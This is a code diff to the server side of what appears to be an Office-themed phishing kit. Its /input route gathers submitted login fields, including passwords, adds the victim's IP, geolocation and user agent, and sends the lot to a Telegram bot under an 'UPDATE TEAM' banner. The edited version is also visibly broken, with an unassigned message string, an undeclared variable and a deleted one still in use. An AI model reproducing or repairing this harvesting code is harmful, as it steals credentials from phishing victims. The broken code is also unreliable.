@@ -329,8 +329,8 @@ app.get('/events', (req, res) => {
 app.post('/input', async (req, res) => {
     try {
         const { clientId, currPage, inputs } = req.body;
-        const myObjects = Object.keys(req.body);
-        console.log(req.body);
+
+
 
         console.log('Received /input request:', req.body);
         const ipAddress = getClientIp(req);
@@ -368,19 +368,17 @@ app.post('/input', async (req, res) => {
         const userAgent = req.headers["user-agent"];
         const systemLang = req.headers["accept-language"];
         const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
-
-        if (lowerCaseMyObjects.includes('password')) {
-            let message = `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
+		
+			if (inputs && typeof inputs === 'object' && Object.keys(inputs).length > 0) {
+			  `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
                 `👤 LOGIN \n\n`;
-
-            for (const key of myObjects) {
-                if (key.toLowerCase() !== 'visitor' && req.body[key] !== "") {
-                    console.log(`${key}: ${req.body[key]}`);
-                    message += `${key}: ${req.body[key]}\n`;
-                }
-            }
-
-            message += `🌍 GEO-IP INFO\n` +
+                
+			  const inputKeys = Object.keys(inputs);
+			
+			  // Iterate over each key and access its corresponding value
+			  inputKeys.forEach(key => {
+			  	if (key === 'password') {
+			  		message += `🌍 GEO-IP INFO\n` +
                 `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
                 `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
                 `CITY             : ${ipAddressInformation.location.city}\n` +
@@ -393,12 +391,22 @@ app.post('/input', async (req, res) => {
                 `USER AGENT       : ${userAgent}\n` +
                 `SYSTEM LANGUAGE  : ${systemLang}\n` +
                 `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-            const sendMessage = sendMessageFor(botToken, chatId);
+				      return;
+				    }
+			    const value = inputs[key];
+			    console.log(`${key}: ${value}\n`);
+			    message += `${key}: ${value}\n`;
+			    
+			  });
+			  const sendMessage = sendMessageFor(botToken, chatId);
             sendMessage(message);
             console.log(`message: ${message}`);
-        }
-
+            
+            } else {
+			  console.log('Inputs are empty or not defined.');
+			}
+        
+        
         res.sendStatus(200);
     } catch (error) {
         console.error(`Error processing request: ${error.message}`);
